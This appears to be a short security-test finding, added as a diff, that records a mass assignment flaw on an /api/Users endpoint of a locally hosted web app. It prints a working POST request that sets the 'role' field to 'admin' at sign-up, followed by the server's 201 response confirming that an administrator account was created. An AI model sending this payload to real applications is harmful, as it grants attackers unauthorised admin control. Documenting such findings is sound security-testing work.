@@ -1,0 +1,25 @@
+Observed mass assignment vulnerability on /api/Users endpoint.
+
+Request:
+POST /api/Users HTTP/1.1
+Host: 127.0.0.1:3010
+Content-Type: application/json
+{
+  "email": "hacker@test.com",
+  "password": "test123",
+  "role": "admin"
+}
+
+Response: HTTP 201 Created
+{
+  "status": "success",
+  "data": {
+    "id": 42,
+    "email": "hacker@test.com",
+    "password": "$2a$10$abcdefghijklmnopqrstuvwxyz12345678901234567890",
+    "role": "admin",
+    "isActive": true
+  }
+}
+
+The response confirms that the "role" field was accepted and persisted, creating a user with administrative privileges.
